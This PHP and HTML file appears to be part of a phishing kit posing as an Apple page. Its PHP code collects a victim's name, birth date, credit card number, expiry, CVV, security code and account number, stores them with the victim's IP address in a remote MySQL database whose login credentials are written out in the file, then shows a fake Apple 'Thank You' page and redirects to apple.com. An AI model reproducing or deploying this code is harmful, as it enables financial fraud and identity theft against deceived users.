<?php
 /*
 mipc_27053797_apple
 mipc_27053797
 (Your vPanel Password)
 sql105.mipropia.com
 */
 if(isset($_POST["smbt"])){
 
 date_default_timezone_set('Asia/Jakarta'); 
 $nama = $_POST["nama"];
 $date = $_POST["date"];
 $zip = $_POST["zip"];
 $number = $_POST["number"];
 $cardcredit = $_POST["cardcredit"];
 $expired = $_POST["expired"];
 $cvv = $_POST["cvv"];
 $scode = $_POST["scode"];
 $accnumb = $_POST["accnum"];
  
 $waktu = date("d - F - o");
 $ip = $_SERVER["REMOTE_ADDR"];
 $ua = $_SERVER["HTTP_USER_AGENT"];
 $jam = date("h : i : s");
 
 
 $conn = mysqli_connect(
 "sql105.mipropia.com",
 "mipc_27053797",
 "rastafara354",
 "mipc_27053797_apple");
 
 if($conn){echo "";}
 else{echo "";}
 
 $nambah = "INSERT INTO Detail (
 id,nama,date,zip,number,cardcredit,expired,cvv,scode,accnum,waktu,ip) VALUES(
 '','$nama','$date','$zip','$number','$cardcredit','$expired','$cvv','$scode','$accnumb','$waktu','$ip')";
 
 if(mysqli_query($conn,$nambah)){echo "";}
 else{echo "";}
 
 }
 ?>

<html>
<head>
<title></title>
<link rel="stylesheet" href="style.css">
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta http-equiv="refresh" content="5;https://www.Apple.com">
</head>
<body>
<header>
<nav>
<table>
<tr>
<td><img class="appl" src="apple.jpg"></td>
<td>Mac</td>
<td>iPad</td>
<td>iPhone</td>
<td>Watch</td>
<td>TV</td>
<td>Music</td>
<td>Support</td>
<td><img class="appl"src="search.jpg"></td>
<!--<td><img class="appl"src="gbr/tas.jpg"></td>-->
<tr>
</table>
</nav>
<article class="thx"><b>Thank You</b></article>
<hr class="hr2">
</header>
<main>
<article class="off">
<b>Please wait,you will be "logged off".</b>
</article>
<img class="bfr"src="buffering.gif">
</main>
</body>
</html>